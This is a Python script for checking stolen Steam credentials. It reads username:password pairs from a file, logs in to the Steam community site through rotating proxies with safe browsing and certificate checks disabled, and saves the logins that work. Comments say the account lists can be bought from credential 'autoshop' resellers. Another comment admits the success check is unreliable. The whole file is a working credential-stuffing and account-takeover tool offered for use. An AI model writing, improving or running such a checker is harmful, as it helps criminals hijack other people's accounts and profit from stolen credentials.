import requests
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

Accounts = []
# You can buy steam logs on any major autoshop reseller.
with open("steam_accounts.txt", "r") as f:
    for Line in f:
        Accounts.append(Line.strip())

Proxies = []
# Swap out current proxies cus they sxck Ass (proxyscrape.com)
with open("proxies.txt", "r") as f:
    for Line in f:
        Proxies.append(Line.strip())

options = webdriver.ChromeOptions()
options.add_argument('--proxy-server={}'.format(Proxies[0]))
options.add_experimental_option('prefs', {'safebrowsing.enabled': False})
options.add_argument('ignore-certificate-errors')

Driver = webdriver.Chrome("C:\\Users\seani\Desktop\Steam_Checker\chromedriver.exe", options=options)

for Account in Accounts:
    Username, Password = Account.split(":")
    Driver.get("https://steamcommunity.com/login/home/?goto=login")
    time.sleep(2)

    U_Field = Driver.find_element(By.CSS_SELECTOR, "input[type='text']")
    P_Field = Driver.find_element(By.CSS_SELECTOR, "input[type='password']")
    S_Field = Driver.find_element(By.CSS_SELECTOR, "input[type='submit']")
    U_Field.send_keys(Username)
    P_Field.send_keys(Password)

    # Issue lies at the submitting of the keys.
    S_Field.submit()
    Driver.implicitly_wait(10)
    Soup = BeautifulSoup(Driver.page_source, 'html.parser')
    # I cant tell if this part works half the time but i can't be arsed changing it XD
    if Soup.find('div', {'class': 'newlogindialog_SideBySide_1Wl13'}) is None:
        print("Login successful:", Account)
        with open("working_accounts.txt", "a") as f:
            f.write(Account + "\n")
    else:
        print("Login failed:", Account)
    Driver.quit()
    if len(Proxies) > 1:
        Proxies = Proxies[1:]
        options = webdriver.ChromeOptions()
        options.add_argument('--proxy-server={}'.format(Proxies[0]))
        options.add_experimental_option('prefs', {'safebrowsing.enabled': False})
        options.add_argument('ignore-certificate-errors')
        Driver = webdriver.Chrome("C:\\Users\seani\Desktop\Steam_Checker\chromedriver.exe", options=options)

Driver.quit()